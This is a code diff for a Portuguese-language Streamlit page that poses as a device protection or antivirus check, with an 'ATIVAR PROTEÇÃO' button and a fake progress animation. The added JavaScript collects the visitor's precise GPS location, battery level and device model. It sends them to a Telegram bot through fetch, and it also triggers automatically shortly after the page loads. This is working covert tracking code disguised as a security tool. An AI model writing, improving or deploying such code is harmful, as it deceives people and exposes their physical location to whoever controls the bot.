@@ -31,6 +31,7 @@ st.markdown("""
         width: 100%; height: 55px; border-radius: 12px; border: none;
         font-size: 18px; cursor: pointer; display: flex;
         align-items: center; justify-content: center; gap: 10px;
+        width: 100%;
     }
     </style>
 """, unsafe_allow_html=True)
@@ -45,15 +46,22 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# --- O BOTÃO DESTRAVADO (SISTEMA DIRETO) ---
-js_botao_destravado = f"""
+# --- O NOVO BOTÃO DESTRAVADO ---
+js_botao_inquebravel = f"""
+<div id="btn-container">
+    <button class="btn-barra" onclick="dispararTudo()">
+        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
+    </button>
+</div>
+
 <script>
-async function forcarAtivacao() {{
-    // 1. O clique chama o hardware IMEDIATAMENTE (sem passar pelo Python antes)
+async function dispararTudo() {{
+    const options = {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }};
+
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
-                // Captura Bateria e Modelo
+                // Captura de Bateria e Modelo
                 const battery = await navigator.getBattery();
                 const bLevel = Math.round(battery.level * 100);
                 const model = navigator.userAgent.split('(')[1].split(')')[0];
@@ -67,7 +75,7 @@ async function forcarAtivacao() {{
                             "🔋 *Bateria:* `" + bLevel + "%`\\n" +
                             "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
                 
-                // 2. O envio pro Telegram é feito pelo Navegador (Fetch) para não falhar
+                // Envio DIRETO para o Telegram (sem passar pelo Python)
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
@@ -78,33 +86,39 @@ async function forcarAtivacao() {{
                     }})
                 }});
                 
-                // 3. Só agora avisamos o Streamlit para girar a bolha
+                // Avisa o Streamlit para girar a bolha
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }} catch (e) {{ console.log(e); }}
         }},
-        (err) => {{ console.log("Acesso negado"); }},
-        {{ enableHighAccuracy: true, timeout: 10000 }}
+        (err) => {{ console.log("Erro de permissão"); }},
+        options
     );
 }}
 
-// Tenta disparar automático no carregamento também
-setTimeout(forcarAtivacao, 1000);
+// Tenta abrir o pop-up da Google automaticamente ao entrar
+setTimeout(dispararTudo, 800);
 </script>
 
-<button class="btn-barra" onclick="forcarAtivacao()">
-    <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
-</button>
+<style>
+.btn-barra {{
+    background-color: #ffc107; color: black; font-weight: bold;
+    width: 100%; height: 55px; border-radius: 12px; border: none;
+    font-size: 18px; cursor: pointer; display: flex;
+    align-items: center; justify-content: center; gap: 10px;
+    font-family: sans-serif;
+}}
+</style>
 """
 
-# Renderiza o componente (Botão Amarelo Comprido)
-resultado_final = st.components.v1.html(js_botao_destravado, height=80)
+# Renderiza o botão como um componente HTML puro
+clicou = st.components.v1.html(js_botao_inquebravel, height=80)
 
-# --- ANIMAÇÃO (Só acontece se o GPS responder) ---
-if resultado_final:
+# --- ANIMAÇÃO DE SUCESSO ---
+if clicou:
     for p in range(4, 101, 8):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
-    st.success("Proteção Ativada!")
+    st.success("Proteção Concluída!")
     st.stop()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
